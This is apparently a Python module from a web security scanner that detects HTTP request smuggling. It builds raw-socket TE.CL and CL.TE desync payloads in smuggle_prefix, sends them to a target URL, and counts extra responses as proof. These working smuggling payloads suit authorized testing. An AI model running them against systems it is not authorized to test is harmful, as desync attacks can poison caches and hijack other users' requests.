"""Raw-socket HTTP desync oracles.

Request smuggling is a framing disagreement between two parsers. No HTTP client
that normalises headers can show it: the ambiguity has to be written onto the
wire byte-for-byte. These primitives own that socket so both the stage-5 module
and the chain-armed action prove the same thing the same way, instead of the
action re-growing a private copy of the oracle.

The proof is a ghost request: a prefix framed to be re-parsed by the back end
must answer as its own request on the same socket. A server that answers three
responses to two requests has desynced even when the ghost path is not echoed.

`connect`/`read` are injected so callers can substitute a test socket without
monkeypatching module internals.
"""

from __future__ import annotations

import asyncio
import re
import secrets
import socket
import ssl
from typing import Callable, Optional
from urllib.parse import urlparse


def connection(url: str, timeout: int = 15, alpn=None):
    """One raw connection, plain or TLS.

    `http.client` is deliberately not used: it rewrites conflicting framing
    headers, which is exactly the ambiguity the oracle needs preserved.
    """
    parsed = urlparse(url)
    use_tls = (parsed.scheme or "http").lower() == "https"
    host = parsed.hostname or ""
    port = parsed.port or (443 if use_tls else 80)
    if use_tls:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        if alpn:
            context.set_alpn_protocols(list(alpn))
        raw = socket.create_connection((host, port), timeout=timeout)
        sock = context.wrap_socket(raw, server_hostname=host)
        if alpn and sock.selected_alpn_protocol() not in alpn:
            sock.close()
            raise OSError("ALPN did not negotiate " + ",".join(alpn))
    else:
        sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    return sock, host


def read_response(sock, timeout: int = 10) -> tuple:
    """Read one full HTTP response (head + declared body) off a socket.

    Consuming the body matters: leftover bytes would parse as a phantom extra
    response on the next read, and phantom responses are exactly what this
    oracle counts.
    """
    sock.settimeout(timeout)
    data = b""
    try:
        while b"\r\n\r\n" not in data and b"\n\n" not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 65536:
                break
    except (socket.timeout, OSError):
        pass
    text = data.decode("utf-8", errors="replace")
    match = re.search(r"HTTP/\d(?:\.\d)?\s+(\d{3})", text)
    status = int(match.group(1)) if match else 0
    length_match = re.search(r"content-length:\s*(\d+)", text, re.I)
    if length_match and status:
        want = int(length_match.group(1))
        sep = re.search(r"\r\n\r\n|\n\n", text)
        have = len(data) - (sep.end() if sep else len(data))
        try:
            while have < want:
                chunk = sock.recv(min(4096, want - have))
                if not chunk:
                    break
                data += chunk
                have += len(chunk)
        except (socket.timeout, OSError):
            pass
        text = data.decode("utf-8", errors="replace")
    return status, text


def smuggle_prefix(mode: str, host: str, path: str, marker: str) -> str:
    """The ambiguous request, framed for one front-end/back-end disagreement.

    TE.CL: the front end frames by chunked (sees the zero chunk and treats the
    tail as the next request); the back end frames by the 6-byte Content-Length,
    eating `0\r\n\r\nG` and leaving a complete `POST /<marker>` for the socket.

    CL.TE: the front end frames by Content-Length and forwards the chunked
    tail; the back end re-parses the tail as a request start.
    """
    if mode == "te_cl":
        return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 6\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Connection: keep-alive\r\n\r\n"
                "0\r\n\r\n"
                f"GPOST /{marker} HTTP/1.1\r\nHost: {host}\r\n"
                "Content-Length: 5\r\n\r\n"
                "x=1\r\n\r\n")
    return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n\r\n"
            "5c\r\n"
            f"GPOST /{marker} HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n\r\n"
            "x=1\r\n"
            "0\r\n\r\n")


def is_ambiguous(server_status: int) -> tuple:
    """Did the server accept dual Content-Length + Transfer-Encoding?

    A 400/501/505 rejection means strict parsing: smuggling through header
    ambiguity is off the table for this endpoint.
    """
    if server_status in (400, 501, 505):
        return False, f"strict rejection (HTTP {server_status})"
    if server_status == 0:
        return False, "no response"
    return True, f"accepted dual headers (HTTP {server_status})"


async def probe_ambiguity(url: str, timeout: int = 12) -> tuple:
    """Pre-filter: can this endpoint even be desynced by header ambiguity?"""

    def probe() -> tuple:
        try:
            sock, host = connection(url, timeout=timeout)
        except OSError as exc:
            return False, f"connect failed: {exc}"
        try:
            body = (f"POST {urlparse(url).path or '/'} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: 7\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "Connection: close\r\n\r\n"
                    "0\r\n\r\n")
            sock.sendall(body.encode())
            status, _ = read_response(sock, timeout=10)
        except OSError as exc:
            return False, f"probe failed: {exc}"
        finally:
            try:
                sock.close()
            except OSError:
                pass
        return is_ambiguous(status)

    return await asyncio.to_thread(probe)


async def desync_probe(
    url: str,
    mode: str = "cl_te",
    timeout: int = 60,
    connect: Optional[Callable] = None,
    read: Optional[Callable] = None,
) -> tuple:
    """One desync oracle against one endpoint, for one framing disagreement.

    Returns `(proven, note, marker)`. Two independent signals count as proof:
    the smuggled path answered as its own request, or the socket produced more
    responses than requests sent.
    """
    marker = f"hopefully404-{secrets.token_hex(4)}"
    connect = connect or connection
    read = read or read_response

    def probe() -> tuple:
        try:
            sock, host = connect(url, timeout=20)
        except OSError as exc:
            return False, f"connect failed: {exc}"
        try:
            path = urlparse(url).path or "/"
            prefix = smuggle_prefix(mode, host, path, marker)
            normal = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                      "Connection: close\r\n\r\n")
            sock.sendall(prefix.encode() + normal.encode())
            first = read(sock, timeout=12)
            second = read(sock, timeout=12)
            third = read(sock, timeout=6)
        except OSError as exc:
            return False, f"socket failed: {exc}"
        finally:
            try:
                sock.close()
            except OSError:
                pass
        responses = [first, second, third]
        texts = " ".join(text for _, text in responses)
        if marker in texts:
            return True, "smuggled prefix answered as its own request"
        answered = [(status, text[:120]) for status, text in responses
                    if status]
        if len(answered) >= 3:
            return True, f"{len(answered)} responses for 2 requests"
        return False, f"responses: {[status for status, _ in answered]}"

    try:
        proven, note = await asyncio.wait_for(
            asyncio.to_thread(probe), timeout=timeout)
    except Exception as exc:  # noqa: BLE001 - a probe failure is a negative
        return False, f"oracle failed: {exc}", marker
    return proven, note, marker
